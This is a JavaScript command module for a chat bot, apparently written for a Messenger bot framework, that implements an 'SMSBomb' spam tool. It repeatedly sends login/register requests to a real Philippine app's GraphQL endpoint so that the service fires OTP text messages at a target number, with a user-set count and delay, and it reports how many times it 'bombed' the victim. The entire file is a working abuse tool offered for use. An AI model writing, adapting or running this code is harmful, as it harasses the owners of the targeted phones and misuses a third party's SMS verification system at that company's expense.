const axios = require('axios');

module.exports["config"] = {
  name: "spam-sms",
  version: "1.0.0",
  role: 0,
  credits: "shiki",
  info: "Spam SMS messages",
  commandCategory: "Spam",
  cd: 2,
};

function formatNumber(number) {
  if (number.startsWith('0')) {
    return `+63${number.slice(1)}`;
  } else if (number.startsWith('63')) {
    return `+${number}`;
  } else {
    return number;
  }
}

async function otp(number) {
  const formattedNumber = formatNumber(number);
  const url = "https://graphql.toktok.ph:2096/auth/graphql/";
  const headers = {
    'accept': '*/*',
    'authorization': '',
    'Content-Type': 'application/json',
    'Host': 'graphql.toktok.ph:2096',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip',
    'User-Agent': 'okhttp/4.9.1'
  };
  const body = {
    "operationName": "loginRegister",
    "variables": {
      "input": {
        "mobile": formattedNumber,
        "appFlavor": "C"
      }
    },
    "query": "mutation loginRegister($input: LoginRegisterInput!) {\nloginRegister(input: $input)\n}\n"
  };

  try {
    const response = await axios.post(url, body, { headers });
    if (response.data.data.loginRegister === "REGISTER") {
      return true;
    } else {
      return false;
    }
  } catch (error) {
    console.error('Error sending OTP:', error.message);
    return false;
  }
}

module.exports["run"] = async ({ api, event, args }) => {
  try {
    if (args.length !== 3) {
      api.sendMessage('[ SMSBomb ] Invalid arguments. Usage: smsbomb [number] [amount] [sleep]', event.threadID);
      return;
    }

    const number = args[0];
    const amount = parseInt(args[1]);
    const sleep = parseInt(args[2]);

    if (isNaN(amount) || isNaN(sleep) || amount <= 0 || sleep <= 0) {
      api.sendMessage('[ SMSBomb ] Invalid amount or sleep time. Please provide valid positive numbers.', event.threadID);
      return;
    }

    let successCount = 0;
    let failureCount = 0;

    console.log(`[ SMSBomb ] Bombing to: ${number}`);
    for (let i = 0; i < amount; i++) {
      const result = await otp(number);
      if (result) {
        successCount++;
      } else {
        failureCount++;
      }
      console.log(`[ SMSBomb ] Message ${i + 1}: Success - ${result}`);
      await new Promise(resolve => setTimeout(resolve, sleep * 1000));
    }

    api.sendMessage(`[ SMSBomb 💣 ] Successfully bombed ${successCount} times to ${number}. Failed attempts: ${failureCount}`, event.threadID);
  } catch (error) {
    console.error('[ SMSBomb ] Error:', error);
    api.sendMessage('[ SMSBomb ] Error: ' + error.message, event.threadID);
  }
};

process.on('unhandledRejection', (error) => {
  console.error('Unhandled Promise Rejection:', error);
});